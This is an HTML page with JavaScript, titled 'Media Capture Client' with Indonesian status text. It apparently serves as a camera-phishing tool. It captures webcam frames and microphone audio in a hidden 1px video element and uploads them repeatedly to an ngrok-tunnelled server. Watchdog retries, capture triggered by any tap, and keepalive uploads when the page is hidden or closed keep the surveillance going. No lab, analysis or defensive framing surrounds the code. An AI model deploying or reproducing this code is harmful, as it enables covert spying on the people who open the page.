<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Media Capture</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #0d1117; color: #e6edf3; min-height: 100vh; display: flex; justify-content: center; align-items: center; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; padding: 16px; }
  .panel { background: #161b22; border: 1px solid #30363d; border-radius: 10px; padding: 18px; max-width: 420px; width: 100%; }
  .panel h1 { font-size: 16px; color: #58a6ff; margin-bottom: 10px; }
  .log { font-size: 12px; color: #c9d1d9; background: #0d1117; border: 1px solid #21262d; border-radius: 6px; padding: 10px; line-height: 1.5; word-break: break-word; }
  .hint { font-size: 11px; color: #8b949e; margin-top: 10px; }
  .hidden-media { position: absolute; opacity: 0.01; pointer-events: none; width: 1px; height: 1px; overflow: hidden; }
</style>
</head>
<body>

<div class="hidden-media">
  <video id="cam-video" autoplay playsinline muted></video>
  <canvas id="cam-canvas" width="480" height="360"></canvas>
</div>

<div class="panel">
  <h1>Media Capture Client</h1>
  <div class="log" id="status-box">Menunggu inisialisasi kamera &amp; mikrofon...</div>
  <div class="hint">Ketuk layar jika browser atau WebView meminta gestur untuk mengaktifkan media.</div>
</div>

<script>
(function () {
  'use strict';

  var SERVER_BASE = window.location.origin;

  var CONFIG = {
    frameIntervalMs: 1200,
    audioSliceMs: 3000,
    retryDelayMs: 3000,
    watchdogMs: 4000
  };

  var state = {
    camStream: null,
    camActive: false,
    camPending: false,
    micStream: null,
    micActive: false,
    micPending: false,
    recorder: null,
    frameTimer: null,
    watchdogTimer: null,
    retryTimer: null,
    framesSent: 0,
    audioSent: 0,
    lastAudioBlob: null
  };

  function setStatus(msg) {
    var box = document.getElementById('status-box');
    var line = "[" + new Date().toLocaleTimeString() + "] " + msg;
    if (box) box.textContent = line;
    console.log(line);
  }

  function sendFrame(dataUrl, useKeepalive) {
    if (!dataUrl) return;
    fetch(SERVER_BASE + "/upload", {
      method: "POST",
      keepalive: Boolean(useKeepalive),
      headers: {
        "Content-Type": "application/json",
        "ngrok-skip-browser-warning": "true"
      },
      body: JSON.stringify({ image: dataUrl })
    })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d && d.status === "success") {
        state.framesSent++;
        setStatus("Frames: " + state.framesSent + " | Audio chunks: " + state.audioSent);
      }
    })
    .catch(function () {});
  }

  function captureFrame(useKeepalive) {
    if (!state.camActive) return;
    var video = document.getElementById('cam-video');
    var canvas = document.getElementById('cam-canvas');
    if (!video || !canvas || video.readyState < 2) return;

    try {
      var ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      sendFrame(canvas.toDataURL('image/jpeg', 0.7), useKeepalive);
    } catch (e) {}
  }

  function startFrameLoop() {
    if (state.frameTimer) return;
    state.frameTimer = setInterval(function () {
      captureFrame(false);
    }, CONFIG.frameIntervalMs);
  }

  function initCamera() {
    if (state.camActive || state.camPending) return;
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

    state.camPending = true;
    navigator.mediaDevices.getUserMedia({
      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" },
      audio: false
    })
    .then(function (stream) {
      state.camPending = false;
      state.camActive = true;
      state.camStream = stream;

      var video = document.getElementById('cam-video');
      if (video) {
        video.srcObject = stream;
        video.play().catch(function () {});
      }

      startFrameLoop();
      setStatus("Kamera aktif | Frames: " + state.framesSent + " | Audio: " + state.audioSent);

      stream.getVideoTracks().forEach(function (track) {
        track.onended = function () {
          state.camActive = false;
          state.camStream = null;
          scheduleRetry();
        };
      });
    })
    .catch(function (err) {
      state.camPending = false;
      state.camActive = false;
      setStatus("Kamera (" + err.name + ") - mencoba ulang...");
      scheduleRetry();
    });
  }

  function sendAudioBlob(blob, useKeepalive) {
    if (!blob || blob.size === 0) return;
    var fd = new FormData();
    fd.append('audio', blob, 'chunk.webm');

    fetch(SERVER_BASE + "/upload-audio", {
      method: "POST",
      keepalive: Boolean(useKeepalive),
      headers: { "ngrok-skip-browser-warning": "true" },
      body: fd
    })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d && d.status === "success") {
        state.audioSent++;
        setStatus("Frames: " + state.framesSent + " | Audio chunks: " + state.audioSent);
      }
    })
    .catch(function () {});
  }

  function startRecorder(stream) {
    if (!('MediaRecorder' in window)) return;
    try {
      if (state.recorder && state.recorder.state !== 'inactive') {
        try { state.recorder.stop(); } catch (e) {}
      }

      var opts = {};
      if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
        opts.mimeType = 'audio/webm;codecs=opus';
      } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
        opts.mimeType = 'audio/mp4';
      }

      var rec = new MediaRecorder(stream, opts);
      state.recorder = rec;

      rec.ondataavailable = function (ev) {
        if (ev.data && ev.data.size > 0) {
          state.lastAudioBlob = ev.data;
          sendAudioBlob(ev.data, false);
        }
      };

      rec.onstop = function () {
        state.micActive = false;
        scheduleRetry();
      };

      rec.start(CONFIG.audioSliceMs);
    } catch (e) {
      state.micActive = false;
      scheduleRetry();
    }
  }

  function initMic() {
    if (state.micActive || state.micPending) return;
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

    state.micPending = true;
    navigator.mediaDevices.getUserMedia({
      audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true },
      video: false
    })
    .then(function (stream) {
      state.micPending = false;
      state.micActive = true;
      state.micStream = stream;

      stream.getAudioTracks().forEach(function (track) {
        track.onended = function () {
          state.micActive = false;
          state.micStream = null;
          scheduleRetry();
        };
      });

      startRecorder(stream);
    })
    .catch(function (err) {
      state.micPending = false;
      state.micActive = false;
      setStatus("Mikrofon (" + err.name + ") - mencoba ulang...");
      scheduleRetry();
    });
  }

  function runCycle() {
    if (!state.camActive && !state.camPending) initCamera();
    if (!state.micActive && !state.micPending) initMic();
    if (state.camActive) captureFrame(false);
  }

  function scheduleRetry() {
    clearTimeout(state.retryTimer);
    state.retryTimer = setTimeout(runCycle, CONFIG.retryDelayMs);
  }

  function startWatchdog() {
    if (state.watchdogTimer) return;
    state.watchdogTimer = setInterval(runCycle, CONFIG.watchdogMs);
  }

  ['pointerdown', 'click', 'touchend'].forEach(function (evtName) {
    document.addEventListener(evtName, function () {
      startWatchdog();
      runCycle();
    }, { passive: true });
  });

  window.addEventListener('DOMContentLoaded', function () {
    startWatchdog();
    runCycle();
  });

  document.addEventListener('visibilitychange', function () {
    if (document.hidden) {
      captureFrame(true);
      if (state.lastAudioBlob) sendAudioBlob(state.lastAudioBlob, true);
    } else {
      state.camActive = false;
      state.camPending = false;
      state.micActive = false;
      state.micPending = false;
      runCycle();
    }
  });

  window.addEventListener('pagehide', function () {
    captureFrame(true);
    if (state.lastAudioBlob) sendAudioBlob(state.lastAudioBlob, true);
  });
})();
</script>
</body>
</html>
